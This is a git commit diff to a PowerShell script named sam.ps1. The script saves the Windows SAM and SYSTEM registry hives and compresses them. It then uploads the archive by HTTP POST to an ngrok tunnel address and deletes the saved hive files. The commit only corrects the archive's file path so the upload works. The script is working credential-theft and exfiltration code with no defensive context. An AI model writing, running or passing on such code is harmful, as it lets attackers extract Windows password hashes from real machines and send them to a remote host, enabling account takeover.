1edb1ae41ea304996e406a027e1be24d26589011
Lex <104235290+VBV11@users.noreply.github.com>
2026-07-02 16:44:28 +0200

    Update file path from dump.zip to hives.zip

--- sam.ps1
+++ sam.ps1
@@ -1,7 +1,7 @@
 reg save hklm\sam sam;
 reg save hklm\system sys;
 Compress-Archive -Path "$PWD\sys", "$PWD\sam" -DestinationPath "C:\WINDOWS\system32\hives.zip" -Force;
-$file = [IO.File]::ReadAllBytes("C:\WINDOWS\system32\dump.zip");
+$file = [IO.File]::ReadAllBytes("C:\WINDOWS\system32\hives.zip");
 iwr "https://monorail-moonlike-afoot.ngrok-free.dev/" -Method POST -Body $file -UseBasicParsing;
 remove-item sys;
 remove-item sam;
